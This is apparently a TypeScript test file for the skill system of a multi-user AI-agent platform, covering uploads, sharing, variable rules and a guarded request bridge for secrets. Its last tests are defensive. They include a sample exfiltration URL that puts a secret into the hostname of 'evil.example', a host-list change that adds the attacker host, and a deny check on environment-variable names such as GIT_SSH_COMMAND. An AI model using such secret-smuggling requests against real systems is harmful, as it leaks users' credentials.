import { after, test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const home = fs.mkdtempSync(path.join(os.tmpdir(), "aim-skills-"));
process.env.AGENT_LOFT_HOME = home;
// 机器上原有的技能：假的家目录里放一个
const fakeHome = path.join(home, "home");
process.env.HOME = fakeHome;
delete process.env.CLAUDE_CONFIG_DIR;
fs.mkdirSync(path.join(fakeHome, ".claude", "skills", "nas-tool"), { recursive: true });
fs.writeFileSync(path.join(fakeHome, ".claude", "skills", "nas-tool", "SKILL.md"), "---\nname: nas-tool\ndescription: 管 NAS\n---\n\n做事");
fs.mkdirSync(path.join(home, "data"), { recursive: true });
fs.writeFileSync(path.join(home, "config.json"), "{}");
const keepAlive = setInterval(() => {}, 1000);
after(() => clearInterval(keepAlive));

const { loadConfig } = await import("../src/core/config.js");
loadConfig();
const users = await import("../src/core/users.js");
const skills = await import("../src/core/skills.js");
const runtime = await import("../src/core/skill-runtime.js");
const { readZip, writeZip } = await import("../src/core/zip.js");

const admin = users.createUser({ name: "boss", password: "password-1", role: "admin" });
const alice = users.createUser({ name: "alice", password: "password-1", role: "member" });
const bob = users.createUser({ name: "bob", password: "password-1", role: "member" });

test("SKILL.md：拆出 name / description（含多行写法），其余 frontmatter 原样保留", () => {
  const md = skills.parseSkillMd("---\nname: pdf\ndescription: >\n  处理 PDF\n  的技能\nallowed-tools: Bash\n---\n\n# 正文\n");
  assert.equal(md.name, "pdf");
  assert.equal(md.description, "处理 PDF 的技能");
  assert.deepEqual(md.extra, ["allowed-tools: Bash"]);
  assert.equal(md.body, "# 正文");
  const out = skills.composeSkillMd("pdf", '说"明"', "正文", md.extra);
  const again = skills.parseSkillMd(out);
  assert.equal(again.description, '说"明"');
  assert.deepEqual(again.extra, ["allowed-tools: Bash"]);
  assert.equal(skills.parseSkillMd("没有 frontmatter").body, "没有 frontmatter");
});

test("上传：zip 解包、去掉顶层目录、读 agent-loft.json 的变量、拒绝越界路径", () => {
  const zip = writeZip([
    { path: "weather/SKILL.md", data: Buffer.from("---\nname: weather\ndescription: 查天气\n---\n\n用 $WEATHER_KEY 调接口") },
    { path: "weather/scripts/get.sh", data: Buffer.from("#!/bin/sh\necho hi\n") },
    { path: "weather/agent-loft.json", data: Buffer.from(JSON.stringify({ vars: [{ name: "WEATHER_KEY", secret: true, required: true }] })) },
    { path: "__MACOSX/weather/._SKILL.md", data: Buffer.from("x") },
  ]);
  const up = skills.prepareUpload(readZip(zip, 1e7));
  assert.equal(up.md.name, "weather");
  assert.deepEqual([...up.files.keys()], ["scripts/get.sh"]);
  assert.equal(up.vars?.[0]?.name, "WEATHER_KEY");
  assert.throws(() => skills.prepareUpload([{ path: "../x/SKILL.md", data: Buffer.from("x") }]), /不合规/);
  assert.throws(() => skills.prepareUpload([{ path: "a.txt", data: Buffer.from("x") }]), /SKILL\.md/);
});

test("变量名：保留的、会被剔除的不让用", () => {
  assert.throws(() => skills.cleanVars([{ name: "PATH" }]), /系统或 agent/);
  assert.throws(() => skills.cleanVars([{ name: "ANTHROPIC_API_KEY" }]), /系统或 agent/);
  assert.throws(() => skills.cleanVars([{ name: "lower" }]), /不合规/);
  assert.throws(() => skills.cleanVars([{ name: "GIT_SSH_COMMAND" }]), /系统或 agent/);
  assert.throws(() => skills.cleanVars([{ name: "PYTHONPATH" }]), /系统或 agent/);
  assert.equal(skills.cleanVars([{ name: "GIT_DIGEST_TOKEN" }])[0]?.name, "GIT_DIGEST_TOKEN");
  assert.deepEqual(skills.cleanVars([{ name: "MY_KEY", secret: true }]), [{ name: "MY_KEY", description: "", secret: true, required: false }]);
});

test("可见性、安装、停用：作者改了装的人跟着变；取消分享后就用不了了", () => {
  const events: string[][] = [];
  skills.skillEvents.on("changed", (u) => events.push(u));
  const up = skills.prepareUpload([
    { path: "SKILL.md", data: Buffer.from("---\nname: weather\ndescription: 查天气\n---\n\n用 $WEATHER_KEY") },
    { path: "agent-loft.json", data: Buffer.from(JSON.stringify({ vars: [{ name: "WEATHER_KEY", secret: true, required: true }] })) },
  ]);
  const s = skills.createSkill(alice.id, { visibility: "users", sharedWith: [bob.id] }, "upload", up);
  assert.throws(() => skills.createSkill(bob.id, { name: "weather", description: "x", body: "y" }, "manual"), /已经有叫 weather/);
  assert.equal(skills.canSee({ id: bob.id }, s), true);
  assert.equal(skills.canSee({ id: admin.id }, s), false);
  // bob 装上，填变量
  skills.installSkill(bob.id, s.id, true);
  assert.deepEqual(skills.activeSkills(bob.id).map((x) => x.name), ["weather"]);
  skills.setSkillVars(bob.id, { WEATHER_KEY: "bob-key" });
  assert.deepEqual(skills.skillEnv(bob.id), { WEATHER_KEY: "bob-key" });
  assert.deepEqual(skills.skillEnv(alice.id), {});
  // 作者改了正文：装的人读到的就是新的（同一份文件）
  skills.updateSkill(alice.id, s.id, { body: "新的做法" });
  assert.match(skills.readSkillMd(s.id), /新的做法/);
  assert.match(skills.readSkillMd(s.id), /name: weather/);
  assert.ok(events.some((u) => u.includes(bob.id)), "装了的人要收到变化");
  // 别人改不了
  assert.throws(() => skills.updateSkill(bob.id, s.id, { body: "x" }), /不是你建的/);
  // 变量不合规：整个不改，正文也不动
  assert.throws(() => skills.updateSkill(alice.id, s.id, { body: "半截", vars: [{ name: "PATH" }] }), /系统或 agent/);
  assert.doesNotMatch(skills.readSkillMd(s.id), /半截/);
  // 停用
  skills.setSkillEnabled(bob.id, s.id, false);
  assert.deepEqual(skills.activeSkills(bob.id), []);
  skills.setSkillEnabled(bob.id, s.id, true);
  // 取消分享：bob 那边就没了
  skills.updateSkill(alice.id, s.id, { visibility: "private" });
  assert.deepEqual(skills.activeSkills(bob.id), []);
  // 管理员删不了私有的
  assert.throws(() => skills.deleteSkill({ id: admin.id, role: "admin" }, s.id), /不能删/);
  skills.updateSkill(alice.id, s.id, { visibility: "all" });
  assert.equal(skills.canSee({ id: admin.id }, s), true);
  skills.deleteSkill({ id: admin.id, role: "admin" }, s.id);
  assert.equal(skills.getSkill(s.id), undefined);
  assert.equal(skills.userPrefs(bob.id).installed.length, 0);
});

test("会话：插件目录链接到技能本体；成员看不到机器上的技能，管理员能 @ 到", () => {
  const s = skills.createSkill(alice.id, { name: "notes", description: "记笔记", body: "写到 notes.md", visibility: "all" }, "manual");
  const opts = runtime.sessionSkills(alice.id)!;
  assert.equal(opts.admin, false);
  assert.ok(opts.pluginDir);
  const link = path.join(opts.pluginDir!, "skills", "notes");
  assert.equal(fs.realpathSync(link), fs.realpathSync(skills.skillDir(s.id)));
  assert.ok(fs.existsSync(path.join(opts.pluginDir!, ".claude-plugin", "plugin.json")));
  // 停用后对账：链接删掉
  skills.setSkillEnabled(alice.id, s.id, false);
  runtime.syncPluginDir(alice.id, skills.activeSkills(alice.id));
  assert.equal(fs.existsSync(link), false);
  skills.setSkillEnabled(alice.id, s.id, true);

  assert.deepEqual(runtime.mentionTargets(alice.id).map((t) => t.name), ["notes"]);
  const adminTargets = runtime.mentionTargets(admin.id).map((t) => `${t.kind}:${t.name}`);
  assert.deepEqual(adminTargets, ["machine:nas-tool"]);
  assert.equal(runtime.sessionSkills(undefined), undefined);
});

test("@ 技能：只认能用的；按 agent 和模式给不同的说明", () => {
  assert.deepEqual(runtime.parseMentions("@notes 帮我记一下，邮件 a@b.com、@Notes 再来"), ["notes"]);
  assert.deepEqual(runtime.parseMentions("看看 x@notes"), []);
  assert.equal(runtime.mentionContext("@nas-tool 看看", { owner: alice.id, agent: "claude", mode: "work" }), null);
  const claude = runtime.mentionContext("用 @notes 记一下", { owner: alice.id, agent: "claude", mode: "work" })!;
  assert.match(claude.join("\n"), /loft:notes/);
  const codex = runtime.mentionContext("用 @notes 记一下", { owner: alice.id, agent: "codex", mode: "work" })!;
  assert.match(codex.join("\n"), /SKILL\.md/);
  const chat = runtime.mentionContext("用 @notes 记一下", { owner: alice.id, agent: "claude", mode: "chat" })!;
  assert.match(chat.join("\n"), /写到 notes\.md/);
  const machine = runtime.mentionContext("@nas-tool 看看", { owner: admin.id, agent: "claude", mode: "work" })!;
  assert.match(machine.join("\n"), /Skill 工具调用 nas-tool/);
  assert.doesNotMatch(machine.join("\n"), /loft:/);
});

test("成员发 /机器上的技能 要拦；自带的、agent-loft 的、项目里的放行", () => {
  const native = [
    { name: "compact", description: "", builtin: true },
    { name: "nas-tool", description: "" },
    { name: "docs", description: "" },
  ];
  const cwd = path.join(home, "proj");
  fs.mkdirSync(path.join(cwd, ".claude", "skills", "docs"), { recursive: true });
  assert.equal(runtime.isMachineCommand("nas-tool", native, cwd), true);
  assert.equal(runtime.isMachineCommand("anthropic-skills:nas-tool", native, cwd), true);
  assert.equal(runtime.isMachineCommand("compact", native, cwd), false);
  assert.equal(runtime.isMachineCommand("docs", native, cwd), false);
  assert.equal(runtime.isMachineCommand("loft:notes", native, cwd), false);
  assert.equal(runtime.isMachineCommand("whatever", native, cwd), false);
  // 读不到命令表也照样拦（按扫出来的机器技能名）
  assert.equal(runtime.isMachineCommand("nas-tool", [], cwd), true);
  assert.equal(runtime.isMachineCommand("some-plugin:nas-tool", [], cwd), true);
});

test("删用户：他建的技能、设置一起删", () => {
  const s = skills.findSkillByName("notes")!;
  skills.installSkill(bob.id, s.id, true);
  skills.purgeUserSkills(alice.id);
  assert.equal(skills.findSkillByName("notes"), undefined);
  assert.deepEqual(skills.activeSkills(bob.id), []);
  assert.equal(fs.existsSync(path.join(skills.pluginsRoot, alice.id)), false);
});

test("受保护的密钥：地址规范化、不进环境变量；填值即确认当时的地址，作者加了新地址要再确认", () => {
  assert.deepEqual(skills.cleanVars([{ name: "API_KEY", secret: true, hosts: ["https://API.Example.com/v1", "127.0.0.1:9", "*.foo.dev"] }])[0]?.hosts, [
    "api.example.com",
    "127.0.0.1:9",
    "*.foo.dev",
  ]);
  // 不是密钥：地址没意义，丢掉
  assert.equal(skills.cleanVars([{ name: "API_BASE", hosts: ["x.com"] }])[0]?.hosts, undefined);
  assert.throws(() => skills.cleanVars([{ name: "API_KEY", secret: true, hosts: ["bad host"] }]), /不合规/);
  const allow = (list: string[], url: string) => skills.hostAllowed(list, new URL(url));
  assert.equal(allow(["api.x.com"], "https://api.x.com:8443/a"), true);
  assert.equal(allow(["api.x.com:443"], "https://api.x.com/a"), true);
  assert.equal(allow(["api.x.com:443"], "http://api.x.com/a"), false);
  assert.equal(allow(["*.x.com"], "https://a.b.x.com/"), true);
  assert.equal(allow(["*.x.com"], "https://x.com/"), false);
  assert.equal(allow(["api.x.com"], "https://api.x.com.evil.io/"), false);

  const s = skills.createSkill(
    bob.id,
    { name: "guarded", description: "调受保护的接口", body: "用 skill_request", vars: [{ name: "GUARD_KEY", secret: true, hosts: ["127.0.0.1"] }, { name: "GUARD_BASE" }] },
    "manual",
  );
  skills.setSkillVars(bob.id, { GUARD_KEY: "super-secret-value", GUARD_BASE: "http://127.0.0.1" });
  assert.deepEqual(skills.skillEnv(bob.id), { GUARD_BASE: "http://127.0.0.1" });
  assert.deepEqual(skills.userPrefs(bob.id).approved, { GUARD_KEY: ["127.0.0.1"] });
  // 作者加了一个地址：没确认之前不放行
  skills.updateSkill(bob.id, s.id, { vars: [{ name: "GUARD_KEY", secret: true, hosts: ["127.0.0.1", "evil.example"] }, { name: "GUARD_BASE" }] });
  assert.deepEqual(skills.declaredHosts(skills.activeSkills(bob.id), "GUARD_KEY"), ["127.0.0.1", "evil.example"]);
  assert.deepEqual(skills.userPrefs(bob.id).approved.GUARD_KEY, ["127.0.0.1"]);
  skills.setSkillVars(bob.id, {}, ["GUARD_KEY"]);
  assert.deepEqual(skills.userPrefs(bob.id).approved.GUARD_KEY, ["127.0.0.1", "evil.example"]);
  skills.updateSkill(bob.id, s.id, { vars: [{ name: "GUARD_KEY", secret: true, hosts: ["127.0.0.1"] }, { name: "GUARD_BASE" }] });
  skills.setSkillVars(bob.id, { GUARD_KEY: "super-secret-value" });
  // 会话提示里说清楚怎么用，但不带值
  const opts = runtime.sessionSkills(bob.id)!;
  assert.match(opts.prompt ?? "", /GUARD_KEY（只能发往 127\.0\.0\.1）/);
  assert.doesNotMatch(opts.prompt ?? "", /super-secret-value/);
});

test("skill_request：替换占位符、只发往确认过的地址、不跟随跳转、响应里的密钥抹掉", async () => {
  const http = await import("node:http");
  const seen: string[] = [];
  const server = http.createServer((req, res) => {
    seen.push(String(req.headers.authorization ?? ""));
    if (req.url === "/jump") {
      res.writeHead(302, { location: "https://elsewhere.example/" });
      return res.end();
    }
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ echo: req.headers.authorization, path: req.url }));
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const port = (server.address() as { port: number }).port;
  const { skillRequest } = await import("../src/core/skills-bridge.js");
  try {
    const ok = await skillRequest(bob.id, { url: `http://127.0.0.1:${port}/w?k={{GUARD_KEY}}`, headers: { Authorization: "Bearer {{GUARD_KEY}}" } });
    assert.equal(ok.isError, undefined);
    assert.equal(seen.at(-1), "Bearer super-secret-value");
    assert.doesNotMatch(ok.text, /super-secret-value/);
    assert.match(ok.text, /\[已隐藏 GUARD_KEY\]/);
    // 不在确认过的地址里（换成 localhost 也不行）
    const bad = await skillRequest(bob.id, { url: `http://localhost:${port}/`, headers: { Authorization: "{{GUARD_KEY}}" } });
    assert.equal(bad.isError, true);
    assert.match(bad.text, /只能发往 127\.0\.0\.1/);
    // 密钥塞进主机名里：按替换之后的地址检查
    const sneaky = await skillRequest(bob.id, { url: `http://{{GUARD_KEY}}.evil.example/` });
    assert.equal(sneaky.isError, true);
    // 跳转不跟
    const jump = await skillRequest(bob.id, { url: `http://127.0.0.1:${port}/jump`, headers: { Authorization: "{{GUARD_KEY}}" } });
    assert.match(jump.text, /HTTP 302/);
    assert.match(jump.text, /没有跟随跳转/);
    // 没配 / 没声明的变量
    const missing = await skillRequest(bob.id, { url: `http://127.0.0.1:${port}/?x={{NOPE_KEY}}` });
    assert.equal(missing.isError, true);
    assert.match(missing.text, /NOPE_KEY/);
  } finally {
    server.close();
  }
});
